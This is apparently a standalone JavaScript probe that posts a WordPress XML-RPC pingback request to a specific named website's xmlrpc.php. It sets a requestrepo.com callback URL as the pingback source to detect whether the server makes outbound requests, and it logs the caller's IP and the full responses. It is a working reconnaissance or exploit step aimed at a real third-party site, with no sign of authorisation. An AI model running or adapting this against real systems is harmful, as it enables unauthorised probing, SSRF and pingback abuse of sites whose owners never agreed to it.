const UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36';
const xml=`<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://7xqvfwha.requestrepo.com/ping-source</string></value></param><param><value><string>https://www.riseup.co.il/vouchers/</string></value></param></params></methodCall>`;
console.log('LAB_IP',await fetch('https://api.ipify.org').then(r=>r.text()));
for (const host of ['www.riseup.co.il','riseup.co.il']) {
 try {
  const r=await fetch(`https://${host}/xmlrpc.php`,{method:'POST',redirect:'manual',headers:{'user-agent':UA,'accept':'*/*','content-type':'text/xml'},body:xml});
  const b=await r.text(); console.log('XMLRPC',host,JSON.stringify({status:r.status,headers:Object.fromEntries(r.headers),body:b.slice(0,4000)}));
 } catch(e){console.log('ERR',host,String(e))}
}
